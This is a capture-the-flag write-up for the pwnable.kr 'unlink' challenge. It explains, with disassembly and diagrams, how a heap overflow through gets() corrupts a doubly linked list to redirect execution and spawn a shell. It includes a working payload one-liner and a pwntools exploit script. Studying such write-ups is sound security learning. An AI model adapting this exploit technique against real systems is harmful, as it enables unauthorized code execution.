---
title: Unlink - Pwnable.kr
date: 2017-04-16
categories: [Writeups, Pwnable.kr]
tags: ['Heap overflow', 'Linked list']
image:
    path: "/unsorted/pwnablekr.png"
---


Linked lists are the bread and butter of programmers. Even if you are not aware
of that, your program is probably using this data type somewhere.  Linked lists
come in many flavors: simples, circulars, doubles, xor lists, etc...

The goal of this challenge is to exploit a heap overflow which gives us
complete control over the content of the nodes of a double linked list.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```


Cool, thanks to the evil function `gets` we can overwrite the content of the
heap starting from the address of `A->buf`. 
Here is a first limit: because of `gets` we must avoid newline characters in
our payload.

After the heap overflow, our goal will be to exploit the function `unlink`.
When a node is unlinked the previous and following nodes get linked back
together (note that while the implementation of `unlink` proposed in this code
would work perfectly for node `B`, it will fail and cause the program to crash
if applied to `A` or `C`).

Now, let's analyze a little bit more in detail the situation. 
When `B` gets unlinked two things happen:

- The node pointed by `B->fd` (originally `C`) 
  will change its `bk` value to `B->bk` (originally `A`)
- The node pointed by `B->bk` (originally `A`) 
  will change its `fd` value to `B->fd` (originally `C`)

I wrote "originally" because we have full control over the values of
`B->bk` and `B->fd`. 

My first impression while reading this challenge was: 

> "Ah that's easy, I will just make B->bk point to the return address on the
> stack and overwrite it with the address of 'shell' which I will write into
> B->fd" 

It turns out I was wrong...things are much more interesting.  
Here is the problem: if we write the address of the function `shell` directly
into `B->fd` or `B->bk` then the function `unlink` will try to write at this
same address and guess what, so far I never saw a program where the section
`.text` was in a segment with write permissions!

To recap our constraint is the following: `B->fd` and `B->bk` must always point
to a writable zone of the program. Through the function `unlink` we should be
able to write a word (4 bytes) somewhere in the program, assuming that the value
that we write is a legal "writable" address. 

We can for example use this technique to write somewhere in the stack the address
to which `B->fd` is pointing but we shall not forget that the value of `B->bk`
will be written 4 bytes after the address pointed by `B->fd`.

    HEAP                   +---------------------+
                         B |                     |
    +--------------------+-+--+----+------------+v---+----+------+
    |                    | fd | bk |            |    | bk |      |
    +--------------------+----+-+--+------------+----+----+------+
                                |
                                |
    STACK                       |
                                |
    +-------------------------+-v--+-----------------------------+
    |                         | fd |                             |
    +-------------------------+----+-----------------------------+

The 4 bytes directly pointed by `B->fd` will not be overwritten so thanks to
the heap overflow, we can have full control on their value.
In short, in this way we are able to write on the stack an address which is pointing
to 4 bytes that we can control, not bad no? Usually this is enough to redirect the flow 
of a program, so let's have a look at the instructions to see if we can somehow 
use our "evil-address" on the stack to obtain an exploit.

```nasm
;-- unlink:
0x08048504      55             push ebp
0x08048505      89e5           mov ebp, esp
0x08048507      83ec10         sub esp, 0x10
0x0804850a      8b4508         mov eax, dword [ebp + 8]
0x0804850d      8b4004         mov eax, dword [eax + 4]
0x08048510      8945fc         mov dword [ebp - 4], eax
0x08048513      8b4508         mov eax, dword [ebp + 8]
0x08048516      8b00           mov eax, dword [eax]
0x08048518      8945f8         mov dword [ebp - 8], eax
0x0804851b      8b45f8         mov eax, dword [ebp - 8]
0x0804851e      8b55fc         mov edx, dword [ebp - 4]
0x08048521      895004         mov dword [eax + 4], edx
0x08048524      8b45fc         mov eax, dword [ebp - 4]
0x08048527      8b55f8         mov edx, dword [ebp - 8]
0x0804852a      8910           mov dword [eax], edx
0x0804852c      90             nop
0x0804852d      c9             leave
0x0804852e      c3             ret       
```

At the end of the function `unlink` we got only a normal epilogue
with `leave` and `ret`. We could use the `leave` instruction to
pop into `ebp` our controlled address. If we control `ebp` we can
control `esp` as well, e.g. we could move the value of `ebp` to `esp`
with a `leave` instruction and then wait for a `ret` to redirect
the execution to the address written on the 4 bytes pointed by `esp`.
So let's see what instructions are executed after `unlink` has returned.

```nasm
0x080485f2      e80dffffff     call sym.unlink
0x080485f7      83c410         add esp, 0x10
0x080485fa      b800000000     mov eax, 0
0x080485ff      8b4dfc         mov ecx, dword [ebp - 4]
0x08048602      c9             leave
0x08048603      8d61fc         lea esp, [ecx - 4]
0x08048606      c3             ret
```


Something interesting happens here (see highlighted lines). 
The content of the value on the stack at address `ebp - 4` is copied into
`ecx`. Before returning the value `ecx - 4` is assigned to `esp` thus the
program will return at the address written at `ecx - 4`. 

Ok, let's use this to our advantage. If we overwrite the value on the stack at
`ebp - 4` with an address on the heap, then the execution flow will be
redirected to whatever is written 4 bytes before what's pointed by that address.
As we have full control over the heap we can write the address of `shell` at
that point.


Ok let's do that! 

-   First, we need to overwrite `B->bk` with the address `ebp - 4`.  
    Thanks to the leaks we have the stack address of `A` which corresponds to
    `ebp - 0x14`, we can just add 0x10 to obtain the value that we want. 
-   Second, we need `B->fd` to be equal to an address on the heap that we
    can control, plus 4 bytes. We can use `A->buf` which address is equal to `&A + 8`,
    (we already know the value of `&A`) in this case `B->fd = &A + 8 + 4`.
-   At last, we just need to write the address of the function `shell` (which
    is at `0x80484eb`) at `A->buf`.

Using a debugger we can calculate that `B = A->buf + 16`, as the address
of the function `shell` already takes 4 bytes we need to insert a span of just
12 bytes after that in order to reach `B`.

    HEAP                   

    A         A->buf               B 
    +---------+-----+----------+----------+-----------+------+
    |         |shell|          | A->buf+4 | &A + 0x10 |      |
    +---------+-----+----------+----------+----+------+------+
              |<- 0x10 bytes ->|               |
                                               |
    STACK                                      |
                        &A           ebp-0x4   |
    +--------------------+---+------------+----v-----+-------+
    |                    | A |            | A->buf+4 |       |
    +--------------------+---+------------+----------+-------+
                         |<- 0x10 bytes ->|


Let's use two terminals: one to execute the program and another one to prepare
the input. In the first terminal I executed multiple time the command `cat` 
inside a subshell in order to be able to control the input flow of the program.
The first `cat` is used to block the program before injecting the payload,
the second is used to inject the payload and the third will let us interact with the 
shell.

```console
unlink@ubuntu:~$ (cat -; cat /tmp/mypayload; cat -) | ./unlink
here is stack address leak: 0xffb3dbb4
here is heap address leak: 0x87fe410
now that you have leaks, get shell! 
```

Now we can calculate the payload and write it into a file.

```console
unlink@ubuntu:~$ python -c "print '\xeb\x84\x04\x08' + 'A'*12 + '\x1c\xe4\x7f\x08' + '\xc4\xdb\xb3\xff'" > /tmp/mypayload
```

After pressing Ctrl-D the payload is sent to the input and we get access to a shell.

```console
unlink@ubuntu:~$ (cat -; cat /tmp/mypayload; cat -) | ./unlink
here is stack address leak: 0xffb3dbb4
here is heap address leak: 0x87fe410
now that you have leaks, get shell!
cat flag
conditional_*****_what_*****_from_******_explo1t
```


*NOTE: Probably you noticed a weird `malloc(1024);` in the code. This is not
just a case: after our exploit the `esp` register will point into the heap,
that big malloc is there to make sure that we have enough allocated space on
the heap (which will be our new stack) to execute the function `shell`.*

### Intended solution


Once got a privileged shell we can read the intended solution.
The script below uses [pwntools](https://docs.pwntools.com/en/stable/about.html#module-pwn),
a very practical exploitation framework written in python.

```python
from pwn import *
context.arch = 'i386'         # i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)         # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'             # heap + 16
payload += '4444'
payload += pack(stack - 0x20) # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.
r.sendline( payload )
r.interactive()
```

The intended solution is a bit different from the one I described in this article.
It exploits the `leave` instruction at the end of the function `unlink`.
The address of the stored `ebp` minus 4 is written into `B->fd` so that the 
value of the stored `ebp` will be overwritten with the content of `B->fd`.
After the instruction `leave` the register `ebp` contains the address `heap + 16` 
, which written into `B->bk`.
Finally the epilogue of the function `main` will first load into `ecx` the
value at `heap + 12`, then it will load into `esp` the address of the 
function `shell` (`lea esp, [ecx - 4]`) so that `main` will return into `shell`.

